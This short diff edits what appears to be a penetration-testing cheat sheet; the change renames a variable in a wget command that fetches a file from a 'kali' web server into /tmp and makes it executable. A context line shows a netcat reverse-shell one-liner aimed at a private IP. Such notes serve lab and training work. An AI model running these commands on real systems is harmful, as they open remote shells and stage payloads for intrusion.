@@ -39,7 +39,7 @@ echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.4.49.251 
 
 Download file from local Web server on kali
 ```
-export dlfile=[FILE NAME]; wget http://10.4.49.251/${dlfile} -O /tmp/${dlfile}; chmod +x /tmp/${dlfile}
+FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FILE
 ```
 
 ### Socat
